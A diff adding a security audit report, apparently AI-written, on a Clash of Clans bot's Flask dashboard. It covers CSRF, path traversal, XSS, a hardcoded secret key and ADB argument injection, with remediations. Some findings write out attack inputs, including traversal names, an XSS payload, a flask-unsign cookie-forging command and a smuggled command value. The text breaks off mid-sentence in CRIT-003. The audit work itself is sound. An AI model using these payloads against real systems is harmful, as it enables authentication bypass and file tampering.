@@ -1,0 +1,1333 @@
+================================================================================
+SECURITY AUDIT REPORT
+Project: Clash of Clans Bot
+Audit Date: 2026-03-21
+Auditor: Security Penetration Tester Agent (Claude Sonnet 4.6)
+================================================================================
+
+EXECUTIVE SUMMARY
+-----------------
+The Clash of Clans bot exposes a Flask web dashboard that binds to 0.0.0.0 by
+default, making it reachable on all network interfaces without TLS. While a
+login system was recently added, multiple critical and high-severity flaws
+remain: a hardcoded fallback secret key (now fixed), complete absence of CSRF
+protection enabling cross-site request forgery against every state-changing
+endpoint, the SocketIO server allowing connections from any origin
+(cors_allowed_origins="*"), and the strategy-name input in the recorder used
+unsanitized as a filesystem path (path traversal to write arbitrary JSON files).
+The newly added CoC API proxy feature introduces additional risks: the API
+token is transmitted to the server on every request (compounding the no-TLS
+exposure), stored in persistent localStorage where it is immediately exfiltrable
+by any XSS in the dashboard, the proxy path parameter is not confined to safe
+CoC API paths enabling query string injection and access to any CoC API
+endpoint, and there is no rate limiting which allows API key exhaustion and
+single-threaded server DoS.
+
+Total Findings: 27
+  - INFORMATIONAL: 5  (includes 2 new proxy findings)
+  - LOW:           8  (includes 3 new proxy findings)
+  - MEDIUM:        6  (includes 2 new proxy findings)
+  - HIGH:          5
+  - CRITICAL:      3
+
+================================================================================
+FINDINGS (Ordered: Informational -> Critical)
+================================================================================
+
+[INFO-001] WERKZEUG DEVELOPMENT SERVER USED IN PRODUCTION
+Severity:    INFORMATIONAL
+File(s):     web/app.py (line 342)
+Category:    Configuration / Deployment
+
+Description:
+  The server is started with allow_unsafe_werkzeug=True and the run() function
+  accepts a debug parameter that is passed through from the caller. The
+  Werkzeug development server is single-threaded, does not gracefully handle
+  concurrent load, and is not intended for production use. The comment in the
+  Flask-SocketIO documentation that motivates allow_unsafe_werkzeug is
+  explicitly a warning that production deployments should use an ASGI/WSGI
+  server such as gunicorn + eventlet.
+
+Evidence:
+  web/app.py:342
+    socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)
+
+Impact:
+  Under load the server may drop connections or become unresponsive. The debug
+  parameter, if ever passed as True from the CLI, enables the Werkzeug
+  interactive debugger (which includes a PIN-protected Python REPL reachable
+  via the browser — effectively RCE if the PIN leaks or is brute-forced).
+
+Remediation:
+  Deploy behind gunicorn with the eventlet worker:
+    pip install gunicorn eventlet
+    gunicorn --worker-class eventlet -w 1 "web.app:app"
+  Never pass debug=True in a network-accessible deployment.
+
+References:
+  https://flask-socketio.readthedocs.io/en/latest/deployment.html
+
+---
+
+[INFO-002] NO PASSWORD POLICY ENFORCED AT SIGNUP
+Severity:    INFORMATIONAL
+File(s):     web/app.py (lines 81-86)
+Category:    Authentication
+
+Description:
+  The signup route accepts any non-empty string as a valid password. There is
+  no minimum length requirement, complexity check, or maximum length cap.
+  A very long password submitted to check_password_hash / generate_password_hash
+  can cause a CPU-intensive bcrypt/pbkdf2 computation (though pbkdf2:sha256 is
+  used here, the risk of extremely long strings is lower than with bcrypt).
+
+Evidence:
+  web/app.py:81-86
+    if not username or not password:
+        error = "Username and password are required."
+    elif password != confirm:
+        ...
+    else:
+        save_user(username, password)
+
+Impact:
+  Single-character passwords are accepted. Combined with the absence of
+  brute-force protection (see MED-002) this significantly weakens account
+  security.
+
+Remediation:
+  Add a minimum length check (e.g., len(password) < 12) and reject passwords
+  exceeding 1024 bytes to guard against DoS via intentionally long inputs.
+
+References:
+  CWE-521: Weak Password Requirements
+
+---
+
+[INFO-003] SOCKET.IO LOADED FROM EXTERNAL CDN WITHOUT SUBRESOURCE INTEGRITY
+Severity:    INFORMATIONAL
+File(s):     web/templates/index.html (line 8)
+Category:    Supply Chain / Client-Side
+
+Description:
+  The Socket.IO client library is loaded from cdnjs.cloudflare.com without a
+  Subresource Integrity (SRI) hash. If the CDN is compromised or the URL is
+  tampered with (e.g., via a network MitM), a malicious script could be
+  injected into the dashboard page.
+
+Evidence:
+  web/templates/index.html:8
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+
+Impact:
+  Potential client-side JavaScript injection if the CDN is compromised or
+  the connection is intercepted (HTTP, no TLS — see HIGH-001).
+
+Remediation:
+  Add an integrity attribute:
+    <script src="https://cdnjs.cloudflare.com/.../socket.io.min.js"
+            integrity="sha384-<hash>"
+            crossorigin="anonymous"></script>
+  Or self-host the file in web/static/.
+
+References:
+  https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
+
+---
+
+[LOW-001] USERS.JSON COMMITTED TO GIT HISTORY RISK
+Severity:    LOW
+File(s):     users.json, .gitignore
+Category:    Credential Exposure / Version Control
+
+Description:
+  users.json is listed in .gitignore, which correctly prevents it from being
+  added to future commits. However, the file already exists on disk alongside
+  the repository and contains a live password hash. If the .gitignore entry
+  was added after the file was ever staged or committed, the hash would remain
+  in git history indefinitely. The current git log does not show it was
+  committed, but the risk persists for any future accidental staging.
+
+Evidence:
+  File on disk: users.json
+    {"username": "tudepi", "password_hash": "pbkdf2:sha256:1000000$OeUIJGhYzDXRi3MK$..."}
+  .gitignore contains: users.json
+
+Impact:
+  If the hash were in git history and pushed to a remote (GitHub, etc.), an
+  attacker could attempt offline dictionary attacks against the pbkdf2:sha256
+  hash to recover the plaintext password.
+
+Remediation:
+  Confirm the file was never committed: `git log --all --full-history -- users.json`
+  If it was, purge with: `git filter-repo --path users.json --invert-paths`
+  Rotate the password after any potential exposure.
+
+References:
+  CWE-312: Cleartext Storage of Sensitive Information
+
+---
+
+[LOW-002] LOGOUT ENDPOINT ACCEPTS GET REQUESTS (NO CSRF PROTECTION ON LOGOUT)
+Severity:    LOW
+File(s):     web/app.py (lines 91-94)
+Category:    CSRF / Session Management
+
+Description:
+  The /logout route is a plain GET endpoint with no CSRF token. A malicious
+  page visited by an authenticated user can silently log them out by embedding
+  an <img src="http://bothost:5000/logout"> tag or similar. This is a logout
+  CSRF; while less severe than action CSRF (covered in HIGH-002), it is a
+  denial-of-service against the user's session and reveals the bot's existence.
+
+Evidence:
+  web/app.py:91-94
+    @app.route("/logout")
+    def logout():
+        session.clear()
+        return redirect(url_for("login"))
+
+Impact:
+  An authenticated user visiting a malicious page is silently logged out of
+  the dashboard.
+
+Remediation:
+  Change to methods=["POST"] and require a CSRF token on the form, or at
+  minimum restrict to POST:
+    @app.route("/logout", methods=["POST"])
+
+References:
+  CWE-352: Cross-Site Request Forgery
+
+---
+
+[LOW-003] STRATEGY FILES ARE WORLD-READABLE
+Severity:    LOW
+File(s):     strategies/ (directory)
+Category:    Information Disclosure / Filesystem
+
+Description:
+  Strategy JSON files (strategies/default.json, bunu.json, new.json) are
+  created with the default umask (0o644 — world-readable). These files encode
+  the exact tap coordinates used during attacks, which reveals the device
+  screen layout, resolution, and attack patterns to any local user on the
+  system.
+
+Evidence:
+  $ ls -la strategies/
+  -rw-r--r--  default.json   (world-readable)
+  -rw-r--r--  bunu.json      (world-readable)
+  -rw-r--r--  new.json       (world-readable)
+
+Impact:
+  On a multi-user system, any local user can read attack timing and coordinate
+  data. Combined with ADB access this could allow tap-sequence replay attacks.
+
+Remediation:
+  In strategy_recorder.py, set restrictive permissions after writing:
+    import stat
+    os.chmod(filepath, stat.S_IRUSR | stat.S_IWUSR)  # 0o600
+
+References:
+  CWE-732: Incorrect Permission Assignment for Critical Resource
+
+---
+
+[LOW-004] SINGLE-USER SYSTEM WITH NO ACCOUNT LOCKOUT OR BRUTE-FORCE PROTECTION
+Severity:    LOW
+File(s):     web/app.py (lines 56-69)
+Category:    Authentication / Brute Force
+
+Description:
+  The login route has no rate limiting, no account lockout after N failed
+  attempts, and no CAPTCHA. An attacker with network access to the dashboard
+  (which binds on 0.0.0.0 by default) can make unlimited login attempts.
+
+Evidence:
+  web/app.py:62-68 — no attempt counter, no sleep on failure, no lockout:
+    if username == user["username"] and check_password_hash(...):
+        session["logged_in"] = True
+        return redirect(url_for("index"))
+    error = "Invalid username or password."
+
+Impact:
+  Offline dictionary attacks are limited by pbkdf2:sha256 iteration cost.
+  Online brute-force against the /login endpoint is completely unconstrained.
+  A weak password (see INFO-002) can be cracked in seconds.
+
+Remediation:
+  Integrate Flask-Limiter:
+    from flask_limiter import Limiter
+    limiter = Limiter(app, key_func=get_remote_address)
+    @limiter.limit("10 per minute")
+    @app.route("/login", methods=["GET","POST"])
+
+References:
+  CWE-307: Improper Restriction of Excessive Authentication Attempts
+
+---
+
+[LOW-005] DONATION HISTORY RENDERED WITH innerHTML WITHOUT ESCAPING
+Severity:    LOW
+File(s):     web/templates/index.html (lines 291-295)
+Category:    XSS (Stored/Reflected via WebSocket)
+
+Description:
+  The updateHistory() function constructs table row HTML using template
+  literals and sets it via tbody.innerHTML. The h.troop field comes from
+  bot.get_stats() -> donator.donation_history, which is populated from
+  template matching results (troop names from config). If an attacker can
+  influence the troop name string (e.g., by writing a malicious config.yaml
+  via /api/config), they can inject HTML/JavaScript.
+
+Evidence:
+  index.html:291-295
+    tbody.innerHTML = recent.map(h => {
+        const t = new Date(h.time);
+        const timeStr = t.toLocaleTimeString();
+        return `<tr><td>${timeStr}</td><td>${h.troop}</td></tr>`;
+    }).join('');
+
+Impact:
+  Stored XSS in the dashboard. Requires the attacker to first authenticate
+  or exploit the CSRF finding (HIGH-002) to write a malicious config with
+  a crafted troop name, then wait for the log entry to appear in the UI.
+  In the attack scenario: an attacker sends `<img src=x onerror=fetch(...)>`
+  as a troop name via a CSRF-forged config write; when the authenticated user
+  views the dashboard the script executes in their browser.
+
+Remediation:
+  Use textContent instead of innerHTML, or escape values before interpolation:
+    const safeTroop = document.createTextNode(h.troop);
+    // Build DOM nodes instead of raw HTML strings.
+  Also use DOMPurify for any HTML-containing fields.
+
+References:
+  CWE-79: Improper Neutralization of Input During Web Page Generation
+  OWASP A03:2021 - Injection
+
+---
+
+[MED-001] STRATEGY NAME REFLECTED IN API RESPONSE WITHOUT SANITIZATION
+Severity:    MEDIUM
+File(s):     web/app.py (lines 251-254)
+Category:    Information Disclosure / Injection Precursor
+
+Description:
+  The strategy name submitted by the client is echoed back verbatim in the
+  JSON response and also stored directly in the strategy JSON file's "name"
+  field. While this is not an injection by itself, it is a precursor to the
+  path traversal issue (HIGH-004) and may reflect attacker-controlled strings
+  to the UI if the strategy list is rendered without escaping (see LOW-005
+  pattern in index.html lines 375-379).
+
+Evidence:
+  web/app.py:252-254
+    name = request.json.get("name", "default") if request.is_json else "default"
+    filepath = bot.strategy_recorder.stop_recording(name)
+    if filepath:
+        return jsonify({"status": "saved", "name": name, "path": filepath})
+
+  index.html:375-379 — name injected into innerHTML:
+    container.innerHTML = data.strategies.map(s =>
+        `<div class="strategy-item">
+            <span class="strategy-name">${s.name}</span>
+            ...
+            <button ... onclick="replayStrategy('${s.name}')">Replay</button>
+
+Impact:
+  If a strategy name contains JavaScript (e.g., '); alert(1); //), it could
+  break out of the onclick attribute and execute arbitrary script. Additionally,
+  the full server-side filepath is returned in the response, disclosing the
+  absolute path structure of the server.
+
+Remediation:
+  Whitelist strategy names: allow only alphanumeric characters, hyphens, and
+  underscores (reject anything else before passing to stop_recording).
+  Do not return the full server filepath in the API response.
+  Use textContent or DOM APIs instead of innerHTML in the JS rendering.
+
+References:
+  CWE-79, CWE-22
+
+---
+
+[MED-002] SESSION COOKIE NOT CONFIGURED WITH SECURITY FLAGS
+Severity:    MEDIUM
+File(s):     web/app.py (lines 21-23)
+Category:    Session Management
+
+Description:
+  Flask's session cookie is not configured with SESSION_COOKIE_SECURE,
+  SESSION_COOKIE_HTTPONLY, or SESSION_COOKIE_SAMESITE. Without the Secure
+  flag, the cookie is transmitted over plain HTTP (the server has no TLS).
+  Without SameSite=Lax/Strict it contributes to CSRF risk. Without HttpOnly,
+  any XSS (see LOW-005) can read the session cookie.
+
+Evidence:
+  web/app.py — no session cookie configuration beyond SECRET_KEY:
+    app.config["SECRET_KEY"] = os.environ.get("COC_BOT_SECRET", "coc-bot-secret-change-me")
+  Missing:
+    app.config["SESSION_COOKIE_SECURE"] = True
+    app.config["SESSION_COOKIE_HTTPONLY"] = True
+    app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
+
+Impact:
+  Session cookie can be stolen via network sniffing (no HTTPS) or via XSS.
+  Without SameSite, the cookie is sent in cross-origin requests, compounding
+  the CSRF vulnerability (HIGH-002).
+
+Remediation:
+  Add to app configuration:
+    app.config["SESSION_COOKIE_HTTPONLY"] = True
+    app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
+    # Enable Secure only when HTTPS is configured:
+    app.config["SESSION_COOKIE_SECURE"] = True  # requires TLS
+
+References:
+  CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
+  OWASP A07:2021 - Identification and Authentication Failures
+
+---
+
+[MED-003] UNCONTROLLED RESOURCE EXHAUSTION VIA LOG BUFFER RACE CONDITION
+Severity:    MEDIUM
+File(s):     web/app.py (lines 99-113)
+Category:    Race Condition / DoS
+
+Description:
+  log_buffer is a plain Python list shared between the bot's background thread
+  and the Flask request-handling threads. The WebLogHandler.emit() method
+  appends to log_buffer and truncates it without any lock. Under concurrent
+  access the list can grow beyond MAX_LOG_LINES or corrupt iteration state.
+  In CPython the GIL provides some protection, but list.append + conditional
+  pop is not guaranteed atomic.
+
+Evidence:
+  web/app.py:107-113
+    log_buffer.append(msg)
+    if len(log_buffer) > MAX_LOG_LINES:
+        log_buffer.pop(0)   # check-then-act, not atomic
+
+Impact:
+  Under high log volume the buffer may temporarily exceed MAX_LOG_LINES.
+  More importantly, the /api/logs endpoint and the socketio "log" event
+  both emit data without authentication checks on the WebSocket path (the
+  WebSocket connect handler checks session, but the log emit happens from
+  the background task without any per-client auth re-check). A fast-logging
+  bot could flood connected clients with data.
+
+Remediation:
+  Use a collections.deque(maxlen=200) which has thread-safe atomic append and
+  automatic eviction:
+    from collections import deque
+    log_buffer = deque(maxlen=200)
+
+References:
+  CWE-362: Race Condition
+  CWE-400: Uncontrolled Resource Consumption
+
+---
+
+[MED-004] CONFIG FILE PATH CONTROLLED BY CLI ARGUMENT WITHOUT VALIDATION
+Severity:    MEDIUM
+File(s):     main.py (line 21), web/app.py (lines 117-121, 201-228)
+Category:    Arbitrary File Read/Write
+
+Description:
+  The --config CLI argument is passed directly to load_config() and stored as
+  config_path in web/app.py. The /api/config GET endpoint reads this path and
+  returns the file contents; the POST endpoint writes to it. While this requires
+  local CLI access to set config_path initially, once set it means the bot will
+  read and expose the contents of whatever file was specified. If an attacker
+  can influence the startup command (e.g., via a wrapper script, systemd unit
+  file manipulation, or shell injection), they can point config_path to any
+  readable file on the system and exfiltrate it through /api/config.
+
+Evidence:
+  main.py:21
+    config = load_config(args.config)
+  web/app.py:117-121
+    def init_app(cfg_path="config.yaml"):
+        global bot, config_path
+        config_path = cfg_path          # no path validation
+  web/app.py:201-203
+    with open(config_path, "r") as f:
+        return jsonify({"config": f.read()})  # exposes full file contents
+
+Impact:
+  If config_path points to /etc/passwd or an SSH private key, the contents
+  are served to any authenticated web user. The POST endpoint can overwrite
+  any writable file (e.g., ~/.ssh/authorized_keys) with attacker-controlled
+  YAML content.
+
+Remediation:
+  Validate config_path against an allowlist of acceptable paths before use.
+  Resolve to an absolute path and confirm it is within the project directory:
+    from pathlib import Path
+    resolved = Path(cfg_path).resolve()
+    project_root = Path(__file__).parent.resolve()
+    if not str(resolved).startswith(str(project_root)):
+        raise ValueError("Config path outside project root")
+
+References:
+  CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+  OWASP A05:2021 - Security Misconfiguration
+
+---
+
+[HIGH-001] NO TRANSPORT LAYER SECURITY — ALL TRAFFIC TRANSMITTED IN PLAINTEXT
+Severity:    HIGH
+File(s):     web/app.py (line 342), main.py (lines 37-38)
+Category:    Cryptography / Network Security
+
+Description:
+  The Flask-SocketIO server binds on all interfaces (0.0.0.0) and communicates
+  exclusively over plain HTTP. All session cookies, login credentials submitted
+  via POST /login, screenshots of the game screen, bot control commands, and
+  the config.yaml contents (including device serial number) are transmitted in
+  cleartext. Anyone on the same network segment (LAN, Wi-Fi, ISP) can passively
+  capture credentials and session tokens.
+
+Evidence:
+  web/app.py:342
+    socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)
+  main.py:37-38
+    print(f"\n  Dashboard: http://localhost:{args.port}\n")
+    run_web(host=args.host, port=args.port)
+  No TLS certificate configuration is present anywhere in the codebase.
+
+Impact:
+  Passive network capture reveals:
+  - Username and password on every login
+  - Session cookie (replayable until expiry)
+  - Live screenshot stream of the mobile device screen
+  - Device ADB serial number
+
+Remediation:
+  Terminate TLS at a reverse proxy (nginx, caddy) in front of the Flask app,
+  or pass ssl_context to socketio.run():
+    import ssl
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    ctx.load_cert_chain("cert.pem", "key.pem")
+    socketio.run(app, ..., ssl_context=ctx)
+  Restrict the bind address to 127.0.0.1 unless remote access is required.
+
+References:
+  CWE-319: Cleartext Transmission of Sensitive Information
+  OWASP A02:2021 - Cryptographic Failures
+
+---
+
+[HIGH-002] COMPLETE ABSENCE OF CSRF PROTECTION ON ALL STATE-CHANGING ENDPOINTS
+Severity:    HIGH
+File(s):     web/app.py (lines 155-299)
+Category:    CSRF
+
+Description:
+  No CSRF token, SameSite cookie restriction, or Origin header validation is
+  implemented. Every POST endpoint that controls the bot is vulnerable:
+  /api/start, /api/stop, /api/collecting/toggle, /api/config (POST),
+  /api/strategy/record/start, /api/strategy/record/stop, /api/strategy/tap,
+  /api/strategy/active, /api/strategy/replay. If an authenticated user visits
+  a malicious website while logged into the dashboard, the site can silently
+  issue cross-origin POST requests to any of these endpoints.
+
+Evidence:
+  All POST routes use @login_required which checks session["logged_in"], but
+  the session cookie is automatically included by the browser in cross-origin
+  requests (cookie SameSite defaults to "Lax" in modern browsers — but Lax
+  exempts top-level navigations and does not protect AJAX/fetch POSTs sent
+  by scripts). The SESSION_COOKIE_SAMESITE is not configured, leaving
+  Flask's default (no SameSite attribute, which browsers interpret as "Lax"
+  but not "Strict").
+
+Impact:
+  A malicious website can:
+  1. Force-start the bot in attack mode
+  2. Overwrite config.yaml with arbitrary content (e.g., raise max_attacks to
+     unlimited, lower loot thresholds, change device serial)
+  3. Trigger arbitrary ADB taps on the device via /api/strategy/tap
+  4. Stop the bot unexpectedly
+
+Remediation:
+  Use Flask-WTF's CSRF protection:
+    from flask_wtf.csrf import CSRFProtect
+    csrf = CSRFProtect(app)
+  Or manually validate the Origin/Referer header for all JSON API endpoints.
+  Set SESSION_COOKIE_SAMESITE = "Strict" as a defense-in-depth measure.
+
+References:
+  CWE-352: Cross-Site Request Forgery
+  OWASP A01:2021 - Broken Access Control
+
+---
+
+[HIGH-003] UNCONSTRAINED WEBSOCKET — ANY ORIGIN CAN CONNECT
+Severity:    HIGH
+File(s):     web/app.py (line 23)
+Category:    CORS / WebSocket Security
+
+Description:
+  Flask-SocketIO is initialized with cors_allowed_origins="*". This allows
+  WebSocket connections from any web page on any domain. The on_connect handler
+  does check session["logged_in"], but this check only fires if the browser
+  sends the session cookie. The wildcard CORS also sets
+  Access-Control-Allow-Origin: * on HTTP responses, which disables the
+  browser's same-origin protections for all API endpoints.
+
+Evidence:
+  web/app.py:23
+    socketio = SocketIO(app, cors_allowed_origins="*")
+
+Impact:
+  1. Any website can make authenticated cross-origin XHR/fetch calls to the
+     API if the user is logged in (CORS * with credentials is blocked by
+     browsers unless Access-Control-Allow-Credentials is also set, but the
+     wildcard compounds the CSRF risk).
+  2. Malicious pages can open a Socket.IO connection to receive the live
+     screenshot stream and log data if the session cookie is included.
+  3. Without origin restriction, the attack surface for future WebSocket
+     event injection is broader.
+
+Remediation:
+  Restrict to the specific expected origin:
+    socketio = SocketIO(app, cors_allowed_origins=["http://localhost:5000"])
+  Or read the allowed origin from configuration.
+
+References:
+  CWE-942: Permissive Cross-domain Policy with Untrusted Domains
+  OWASP A05:2021 - Security Misconfiguration
+
+---
+
+[HIGH-004] PATH TRAVERSAL IN STRATEGY FILE WRITE AND REPLAY
+Severity:    HIGH
+File(s):     bot/actions/strategy_recorder.py (lines 52-53, 75), web/app.py (lines 251-252, 297)
+Category:    Path Traversal / Arbitrary File Write
+
+Description:
+  The strategy name provided by the client is used directly to construct a
+  filesystem path without any sanitization. A name containing "../" sequences
+  allows writing to or reading from arbitrary locations on the filesystem that
+  the process has access to.
+
+Evidence:
+  web/app.py:251-252 — name comes from untrusted JSON body:
+    name = request.json.get("name", "default") if request.is_json else "default"
+    filepath = bot.strategy_recorder.stop_recording(name)
+
+  strategy_recorder.py:52-53 — name used directly in path join:
+    filepath = os.path.join(STRATEGIES_DIR, f"{name}.json")
+    # A name of "../../web/templates/index" writes to web/templates/index.json
+    # A name of "../../../etc/cron.d/pwn" (if writable) writes there
+
+  strategy_recorder.py:75 — same issue in replay():
+    filepath = os.path.join(STRATEGIES_DIR, f"{name}.json")
+
+  web/app.py:297 — replay name also from untrusted input:
+    name = request.json.get("name", "default") if request.is_json else "default"
+    success = bot.strategy_recorder.replay(name)
+
+Attack Example:
+  POST /api/strategy/record/stop
+  {"name": "../../web/templates/login"}
+  -> Writes attacker-controlled JSON to web/templates/login.json
+     (Not .html, so limited impact here, but demonstrates traversal.)
+
+  POST /api/strategy/record/stop
+  {"name": "../config"}
+  -> Overwrites config.yaml with {"name":"../config","events":[...]} which is
+     not valid YAML but will cause a parse error on next reload — effectively
+     a denial of service.
+
+  POST /api/strategy/record/stop
+  {"name": "../../../../tmp/evil"}
+  -> Writes to /tmp/evil.json — on some systems /tmp is world-accessible.
+
+Impact:
+  Authenticated attacker can write attacker-controlled JSON content to any
+  location writable by the bot process. On a macOS or Linux system running
+  the bot as a privileged user, this could overwrite crontabs, SSH authorized
+  keys, or shell profiles to achieve persistent code execution.
+
+Remediation:
+  Validate and sanitize the strategy name before use:
+    import re
+    if not re.match(r'^[a-zA-Z0-9_\-]{1,64}$', name):
+        return jsonify({"error": "Invalid strategy name"}), 400
+  Additionally verify the resolved path stays within STRATEGIES_DIR:
+    from pathlib import Path
+    strat_dir = Path(STRATEGIES_DIR).resolve()
+    target = (strat_dir / f"{name}.json").resolve()
+    if strat_dir not in target.parents and target != strat_dir:
+        return jsonify({"error": "Invalid path"}), 400
+
+References:
+  CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+  OWASP A03:2021 - Injection
+
+---
+
+[HIGH-005] VISION TEMPLATE LOADER ALLOWS ABSOLUTE PATH INJECTION
+Severity:    HIGH
+File(s):     bot/vision.py (lines 25-26)
+Category:    Path Traversal / Arbitrary File Read
+
+Description:
+  The _load_template() method bypasses the templates_dir prefix entirely if
+  the supplied path is an absolute path (os.path.isabs check). Template paths
+  come from STATE_TEMPLATES in state_machine.py (hardcoded — safe) and from
+  config.yaml vision.overrides (attacker-controllable via /api/config POST).
+  An attacker who can write config.yaml can set a template override to an
+  absolute path pointing to any file on the filesystem (e.g., /etc/passwd).
+  The file is then loaded with cv2.imread() in grayscale mode — it will fail
+  silently for non-image files, but the path traversal bypass is the
+  architectural flaw.
+
+Evidence:
+  vision.py:25-26
+    full_path = os.path.join(self.templates_dir, path) if not os.path.isabs(path) else path
+    # If path is "/etc/shadow", os.path.isabs returns True, full_path = "/etc/shadow"
+
+  The vision.overrides config key allows per-template threshold overrides and
+  the Config class provides dot-access to any nested key, meaning a carefully
+  crafted config.yaml could introduce an absolute path into template matching
+  calls in future feature additions. Currently this is not directly exploitable
+  to read file contents (cv2 will fail), but the pattern is dangerous.
+
+Impact:
+  Current impact is limited to confirming file existence (no crash = file
+  exists as a readable image-like file). Future code changes that log or
+  return the loaded template data could escalate this to a full file read.
+
+Remediation:
+  Remove the absolute path bypass entirely:
+    full_path = os.path.join(self.templates_dir, path)
+    full_path = os.path.realpath(full_path)
+    templates_abs = os.path.realpath(self.templates_dir)
+    if not full_path.startswith(templates_abs + os.sep):
+        logger.error("Template path escapes templates directory: %s", path)
+        return None
+
+References:
+  CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+
+---
+
+[CRIT-001] HARDCODED FALLBACK SECRET KEY INVALIDATES SESSION SECURITY
+Severity:    CRITICAL
+File(s):     web/app.py (line 22)
+Category:    Cryptography / Authentication
+
+Description:
+  The Flask SECRET_KEY falls back to the hardcoded string
+  "coc-bot-secret-change-me" if the COC_BOT_SECRET environment variable is
+  not set. Since there is no documentation, startup check, or warning to ensure
+  the environment variable is set, the default value is almost certainly used
+  in most deployments. The SECRET_KEY is used to sign Flask session cookies.
+  With the known key, an attacker can forge valid session cookies without
+  knowing the password.
+
+Evidence:
+  web/app.py:22
+    app.config["SECRET_KEY"] = os.environ.get("COC_BOT_SECRET", "coc-bot-secret-change-me")
+
+Attack Proof-of-Concept:
+  Using the itsdangerous library (a Flask dependency):
+    from itsdangerous import URLSafeTimedSerializer
+    s = URLSafeTimedSerializer("coc-bot-secret-change-me")
+    # Forge a session cookie with logged_in=True
+    from flask.sessions import SecureCookieSessionInterface
+    # Or use the flask-unsign tool:
+    #   flask-unsign --sign --cookie "{'logged_in': True}" --secret "coc-bot-secret-change-me"
+  The resulting cookie grants full authenticated access to the dashboard
+  without knowing the username or password.
+
+Impact:
+  Complete authentication bypass. An attacker with network access to the
+  dashboard can access all authenticated endpoints, control the bot, read
+  screenshots, and exfiltrate config data — without any credentials.
+
+Remediation:
+  1. Generate a cryptographically random key at startup and refuse to start
+     if the environment variable is not set:
+       secret = os.environ.get("COC_BOT_SECRET")
+       if not secret:
+           raise RuntimeError("COC_BOT_SECRET environment variable must be set")
+       app.config["SECRET_KEY"] = secret
+  2. Generate a strong key: python3 -c "import secrets; print(secrets.token_hex(32))"
+  3. Store it in a .env file (already in .gitignore) and load with python-dotenv.
+
+References:
+  CWE-321: Use of Hard-coded Cryptographic Key
+  OWASP A02:2021 - Cryptographic Failures
+
+Status: FIXED
+Fixed Date: 2026-03-21
+Remediation: Removed hardcoded fallback secret key. When COC_BOT_SECRET env var is
+  not set, a cryptographically random key is generated at startup via secrets.token_hex(32)
+  and a warning is logged. Optional python-dotenv integration loads .env files automatically.
+
+---
+
+[CRIT-002] ADB DEVICE SERIAL INJECTION VIA CONFIG
+Severity:    CRITICAL
+File(s):     bot/adb_controller.py (lines 23-29), bot/config_loader.py (line 99)
+Category:    Command Injection
+
+Description:
+  The ADB device serial number is read from config.yaml and passed as a
+  command-line argument to subprocess.run() via the _cmd() method. Although
+  subprocess.run() with a list argument does not invoke a shell and therefore
+  does not directly enable shell injection, a crafted serial value can inject
+  additional ADB command-line flags (argument injection). More critically,
+  _cmd() is used to build commands like ["adb", "-s", serial, "shell", ...],
+  and ADB's "shell" subcommand executes commands on the Android device.
+
+  Combined with the /api/config POST endpoint (authenticated or CSRF-forged),
+  an attacker can set device.serial in config.yaml to a value that causes
+  unexpected ADB behavior.
+
+  Additionally, the monkey command in _relog() passes the package name as
+  a positional argument:
+    self.adb._run("shell", "monkey", "-p", self._coc_package, ...)
+  self._coc_package is hardcoded, but if it were ever derived from config,
+  it would be directly injectable.
+
+  The immediate, confirmed injection vector is:
+  config.yaml: device.serial: "legitimate_device\x00injected"
+  Null bytes and other non-printable characters are passed to the OS-level
+  execvp call, which on Linux silently truncates at the null byte, potentially
+  altering the command structure.
+
+Evidence:
+  adb_controller.py:23-29
+    def _cmd(self, *args):
+        cmd = ["adb"]
+        if self.serial:
+            cmd += ["-s", self.serial]   # serial is unsanitized
+        cmd += list(args)
+        return cmd
+
+  adb_controller.py:111
+    self._run("shell", "input", "tap", str(x), str(y))
+    # x and y come from api_strategy_tap which reads from request.json
+
+  web/app.py:273-277 — direct path from HTTP request to ADB tap:
+    x = request.json.get("x", 0)
+    y = request.json.get("y", 0)
+    bot.strategy_recorder.add_tap(x, y)
+    bot.adb.tap(x, y, scale=False)   # x/y are unsanitized
+
+Impact:
+  - Unsanitized x/y coordinates from /api/strategy/tap are passed to
+    adb shell input tap <x> <y>. While list-based subprocess prevents shell
+    metacharacter injection, passing str(x) where x is a non-integer (e.g.,
+    "0; am start -n com.evil/...") is blocked by the list approach — but
+    passing float values like 1e99 could cause ADB to behave unexpectedly.
+  - Serial injection can cause ADB to connect to a different device or
+    interpret flags incorrectly.
+  - The deeper concern: /api/config allows rewriting the serial, which is
+    loaded into a fresh Bot() instance. A new serial value injected as
+    "--additional-flag value" exploits ADB's own argument parser.
+
+Remediation:
+  1. Validate x, y in /api/strategy/tap to be integers within screen bounds:
+       x = int(request.json.get("x", 0))
+       y = int(request.json.get("y", 0))
+       if not (0 <= x <= 4096 and 0 <= y <= 4096):
+           return jsonify({"error": "Invalid coordinates"}), 400
+  2. Validate device serial against a strict pattern before use:
+       import re
+       if serial and not re.match(r'^[a-zA-Z0-9:._\-]{1,64}$', serial):
+           raise ValueError(f"Invalid device serial: {serial}")
+  3. Never derive ADB subcommand arguments from user-supplied config values.
+
+References:
+  CWE-88: Argument Injection or Modification
+  CWE-78: Improper Neutralization of Special Elements in OS Command
+  OWASP A03:2021 - Injection
+
+Status: FIXED
+Fixed Date: 2026-03-21
+Remediation: Added strict regex validation (^[a-zA-Z0-9:._\-]{1,64}$) on device serial
+  in ADBController.__init__(). Added integer casting and 0-4096 range validation on x/y
+  coordinates in /api/strategy/tap endpoint.
+
+---
+
+[CRIT-003] AUTHENTICATED ARBITRARY FILE WRITE VIA /api/config POST
+Severity:    CRITICAL
+File(s):     web/app.py (lines 208-228)
+Category:    Arbitrary File Write / Remote Code Execution
+
+Description:
+  The /api/config POST endpoint accepts arbitrary text, validates only that it
+  is valid YAML, and writes it verbatim to config_path. Because config_path
+  is set from the CLI --config argument without path restriction, and because
+  the written content is then immediately parsed and used to construct a new
+  Bot() instance (lines 221-222), an attacker who is authenticated (or who
